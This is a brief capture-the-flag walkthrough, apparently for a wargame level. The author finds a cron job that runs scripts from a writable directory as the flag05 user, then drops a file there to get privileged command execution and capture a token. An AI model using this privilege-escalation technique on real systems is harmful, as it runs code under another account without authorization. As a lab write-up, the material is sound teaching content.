## Level 05

Same than level00,we don't have anything in the current path

So i've used the same strategy

                    find -O3 / -user "flag05" 2>/dev/null

I've found something in /usr/sbin/openarenaserver
it's a bash script that search i in /opt/openarenaserver

let's create a fille i in /opt/openarenaserver that contains getflag


```echo "getflag > /tmp/flag" > /opt/openarenaserver/i```

```sh /usr/sbin/opnarenaserver ```

Nope, incorrect flag

in /var/mail/level05, we have a crontab script:
-   */2 * * * * su -c "sh /usr/sbin openarenaserver" - flag05
Every 2 min, it will launch this job in background with the user flag05. 
After doing my echo, i just have to wait until my file disapear and cat /tmp/flag 

Check flag.Here is your token : viuaaale9huek52boumoomioc
